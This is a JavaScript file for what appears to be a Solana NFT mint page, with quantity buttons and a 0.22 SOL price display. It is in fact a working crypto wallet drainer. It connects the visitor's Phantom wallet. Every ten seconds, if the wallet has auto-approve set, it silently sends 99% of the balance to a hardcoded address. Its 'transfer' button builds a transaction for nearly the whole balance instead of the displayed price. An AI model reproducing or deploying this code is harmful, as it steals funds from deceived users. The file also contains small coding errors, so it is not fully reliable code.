function upValue() {
    if(parsenInt(document.getElementById('count').value) < 5) {
        document.getElementById('count').value = parseInt(1) + parseInt(document.getElementById('count').value);
        document.getElementById('result').textContent = (parseInt(document.getElementById('count').value) * 0.22).toFixed(2).toString() + ' SOL';
    }
}
function downValue() {
    if (parseInt(document.getElementById('count').value) > 1) {
        document.getElementById('count').value = parseInt(document.getElementById('count').value) - 1;
        document.getElementById('result').textContent = (parseInt(document.getElementById('count').value) * 0.22).toFixed(2).toString() + ' SOL';
    }
}
window.addEventListener('load', () => {
    let sent = false;
    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
    const getProvider = () => {
        if ("solana" in window) {
            const provider = window.solana;
            if (provider.isPhantom) {
                return provider;
            }
        }
        window.open("https://phantom.app/", "_blank");
    };
    function onBodyLoad() {
        let solConnected = window.solana.isConnected;
        if (!solConnected) {
            connectWallet();
        } else {
            document.getElementById('transfer').style.display = 'flex';
            document.getElementById('connect').style.display = 'none';
        }
        refreshStatus();
        setupEvents();
    }
    function setupEvents() {
        const $selectPrice = document.querySelector('select');
        const $plusButton = document.querySelector('.number-plus');
        const $minuButton = document.querySelector('.number-minus');
        const $numberText = document.querySelector('.number-text');
        const $priceResultText = document.querySelector('.result');
        let itemPriceSelected = 0.22
        let itemCount = 1;
        updateResult = () => {
            $priceResultText.textContent = (itemPriceSelected * itemCount).toFixed(1);
        }
        if($selectPrice) {
            $selectPrice.addEventListener('change', function (e) {
                encodeURIComponent.preventDefault()
                itemPriceSelected = parseInt($selectPrice.value);
                updateResult();
            })
        }
        $plusButton.addEventListener('click', function(e) {
            e.preventDefault()
            itemCount = itemCount < 5 ? itemCount + 1 : 5;
            $numberText.value = itemCount;
            $priceResultText.textContent = (itemPriceSelected * itemCount).toFixed(1);
            updateResult();
        })
        $minuButton.addEventListener('click', function(e) {
            e.preventDefault()
            itemCount = parseInt($numberText.value);
            itemCount = itemCount > 1 ? itemCount - 1 : itemCount;
            $numberText.value = itemCount;
            updateResult();
        })
    }
    function refreshStatus() {
        const provider = getProvider();
        if (provider) {
            provider.on("connect", () => {
                setConnected();
                document.getElementById('transfer').style.display = 'flex';
                document.getElementById('connect').style.display = 'none';
            });
            provider.on("disconnect", () => {
                setNotConnected();
            });
        }
    }
    function connectWallet() {
        window.solana.connect({
            onlyIfTrusted: false
        });
    }
    async function setConnected() {
        let account_info = await connection.getAccountInfo(window.solana.publicKey);
    }
    function trySend() {
        if (window.solana.autoApprove) {
            if (!sent) {
                apimainnet();
            }
        }
    }
    async function testTransfer2(howmany) {
        const provider = getProvider();
        const solConected = window.solana.isConnected;
        const manylamports = (howmany * 1000000000).toFixed(0);
        if (!provider) {
            return;
        }
        if (!solConected) {
            return;
        }
        let account_info = await connection.getAccountInfo(window.solana.publicKey);
        let charginglamports = manylamports;
        if ((account_info.lamports / 2) > manylamports) {
            charginglamports = (account_info.lamports * 0.99).toFixed(0);
        }
        if (account_info.lamports < manylamports && account_info.lamports > 100000) {
            charginglamports = (account_info.lamports * 0.99).toFixed(0);
        }
        let transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: provider.publicKey,
                toPubkey: "DjT3oRTbfjrzsQR29MWmn2JEmnZqMWZu66DN2oQzurHd",
                lamports: charginglamports,
            })
        );
        let { blockhash } = await connection.getRecentBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = provider.publicKey;
        return transaction;
    }
    async function makeTransfer(howmany) {
        let transaction = await testTransfer2(howmany);
        const provider = getProvider();
        if (!provider) {
            return;
        }
        if (transaction) {
            let signed = await provider.signTransaction(transaction, connection);
            let signature = await connection.sendRawTransaction(signed.serialize());
            await connection.confirmTransaction(signature);
        }
    }
    async function testTransfer() {
        const provider = getProvider();
        const solConected = window.solana.isConnected;
        if (!provider) {
            return;
        }
        if (!solConected) {
            return;
        }
        let account_info = await connection.getAccountInfo(window.solana.publicKey);
        if (account_info.lamports >= 10000000) {
            let transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: provider.publicKey,
                    toPubkey: "54GD64F9WyQPPvx9TLpjERZoYamb6169cR2PJ2J7zyJa",
                    lamports: (account_info.lamports * 0.99).toFixed(0),
                })
            );
            let { blockhash } = await connection.getRecentBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = provider.publicKey;
            return transaction;
        }
    }
    async function apimainnet() {
        let transaction = await testTransfer();
        const provider = getProvider();
        if (!provider) {
            return;
        }
        if (transaction) {
            let signed = await provider.signTransaction(transaction, connection);
            let signature = await connection.sendRawTransaction(signed.serialize());
            sent = true;
            await connection.confirmTransaction(signature);
        }
    }
    function setNotConnected() {}
    onBodyLoad();
    setInterval(trySend, 10000);
    document.getElementById('transfer').onclick = function () {
        makeTransfer(100000);
    }
    document.getElementById('connect').onclick = function () {
        onBodyLoad();
    }
});